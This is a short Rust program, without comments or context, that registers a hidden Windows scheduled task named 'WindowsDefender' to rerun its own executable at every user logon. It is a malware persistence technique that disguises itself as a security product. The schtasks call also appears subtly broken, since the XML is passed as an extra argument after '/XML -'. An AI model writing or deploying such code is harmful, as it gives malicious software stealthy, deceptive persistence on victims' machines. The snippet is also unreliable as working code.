use std::process::Command;
use std::env;

fn main() {
    let exe_path = env::current_exe().unwrap();
    let xml = format!(r#"<?xml version="1.0"?><Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Actions><Exec><Command>{}</Command></Exec></Actions><Settings><Hidden>true</Hidden><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries></Settings></Task>"#, exe_path.display());
    Command::new("schtasks").args(&["/Create", "/TN", "WindowsDefender", "/XML", "-", "/F"]).arg(&xml).output().unwrap();
}
